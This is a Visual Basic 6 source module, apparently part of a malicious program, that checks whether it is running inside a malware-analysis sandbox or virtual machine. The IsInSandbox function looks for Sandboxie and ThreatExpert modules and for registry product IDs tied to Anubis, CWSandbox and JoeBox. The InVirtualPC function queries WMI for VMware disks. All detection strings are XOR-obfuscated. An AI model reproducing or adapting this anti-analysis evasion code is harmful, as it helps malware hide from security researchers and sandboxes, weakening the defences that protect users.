Attribute VB_Name = "modSandbox"
Public Declare Function w32_WNetGetUser Lib "mpr.dll" Alias "WNetGetUserA" (ByVal lpszLocalName As String, ByVal lpszUserName As String, lpcchBuffer As Long) As Long
Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Public Declare Function Module32First Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Public Declare Function Module32Next Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Public Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Public Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Public Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long

Public Type MODULEENTRY32
    dwSize As Long
    th32ModuleID As Long
    th32ProcessID As Long
    GlblcntUsage As Long
    ProccntUsage As Long
    modBaseAddr As Byte
    modBaseSize As Long
    hModule As Long
    szModule As String * 256
    szExePath As String * 1024
End Type
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Const KEY_ALL_ACCESS = &H3F
Const TH32CS_SNAPMODULE = &H8

Public Function IsInSandbox() As Long
    Dim hKey As Long, hOpen As Long, hQuery As Long, hSnapShot As Long
    Dim me32 As MODULEENTRY32
    Dim szBuffer As String * 128
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId)
    me32.dwSize = Len(me32)
    Module32First hSnapShot, me32
    Do While Module32Next(hSnapShot, me32) <> 0
        If InStr(1, LCase(me32.szModule), strXOR("16111D11011F185A011F18", "test", False)) > 0 Then 'Sandboxie
            IsInSandbox = 1
        ElseIf InStr(1, LCase(me32.szModule), strXOR("0111131C001F045A011F18", "test", False)) > 0 Then 'ThreatExpert
            IsInSandbox = 2
        End If
    Loop
    CloseHandle (hSnapShot)
    If IsInSandbox = False Then
        hOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, strXOR("361C120012120611393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B", "test", False), 0, KEY_ALL_ACCESS, hKey)
        If hOpen = 0 Then
            hQuery = RegQueryValueEx(hKey, strXOR("35011B101010003D01", "test", False), 0, REG_SZ, szBuffer, 128)
            If hQuery = 0 Then
                If InStr(1, szBuffer, strXOR("5245404C525E4747525E4C40574A4D41505E4646534240", "test", False)) > 0 Then 'Anubis
                    IsInSandbox = 3
                ElseIf InStr(1, szBuffer, strXOR("5245404C525E4240515E474552444447525E4647504244", "test", False)) > 0 Then 'CWSandbox
                    IsInSandbox = 4
                ElseIf InStr(1, szBuffer, strXOR("50464643515E4240555E464252404442515E46475C4644", "test", False)) > 0 Then 'JoeBox
                    IsInSandbox = 5
                End If
            End If
        End If
        RegCloseKey (hKey)
    End If
    If InVirtualPC = True Then IsInSandbox = True
End Function

'For VMware and some other VirtualPCs
Public Function InVirtualPC() As Boolean
    On Error GoTo Err
    
    Dim DetectVirtualPC As String
    Set WMI = GetObject(strXOR("121A1A19021E00075F081D19151606070A1D15000C1C1A3800051118581A19040001071B0B120011185228284B2F061B0A0728170C1E0246", "test", False))
    Set HDS = WMI.ExecQuery(strXOR("361618110607545E4515061B0853231D0B40462B211A071F21011D0200", "test", False))
 
    DetectVirtualPC = ""
    For Each objHDS In HDS
        DetectVirtualPC = DetectVirtualPC & objHDS.Caption & objHDS.Model & objHDS.PNPDeviceID
    Next
 
    If InStr(UCase(DetectVirtualPC), strXOR("333A2620303238", "test", False)) <> 0 Then
        InVirtualPC = True
    Else
        InVirtualPC = False
    End If
    Exit Function
Err: InVirtualPC = True
End Function
